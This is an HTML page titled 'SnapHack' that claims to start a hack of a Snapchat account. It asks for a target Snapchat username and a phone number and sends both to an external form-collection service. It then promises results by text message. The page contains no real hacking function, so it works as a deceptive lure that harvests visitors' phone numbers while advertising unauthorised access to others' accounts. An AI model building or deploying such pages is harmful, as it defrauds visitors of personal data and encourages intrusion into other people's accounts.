<!DOCTYPE html>
<html>
<head>
  <title>SnapHack</title>
  <style>
    body {
      background-color: black;
      color: red;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px;
    }
    input, button {
      padding: 10px;
      margin: 10px;
      border: none;
      border-radius: 5px;
    }
    input {
      width: 250px;
    }
    button {
      background-color: red;
      color: white;
      cursor: pointer;
    }
    #confirmation {
      display: none;
      margin-top: 30px;
    }
  </style>
</head>
<body>

  <h1>SnapHack</h1>
  <p>Enter the info to begin</p>

  <form action="https://formspree.io/f/xrbpvblo" method="POST" onsubmit="showMessage(); return true;">
    <input type="text" name="snapchat_username" placeholder="Snapchat Username" required><br>
    <input type="text" name="phone_number" placeholder="Phone Number" required><br>
    <button type="submit">Start</button>
  </form>

  <div id="confirmation">
    <h2>Thanks!</h2>
    <p>Info will be sent in a text when complete.</p>
  </div>

  <script>
    function showMessage() {
      document.querySelector('form').style.display = 'none';
      document.getElementById('confirmation').style.display = 'block';
    }
  </script>

</body>
</html>
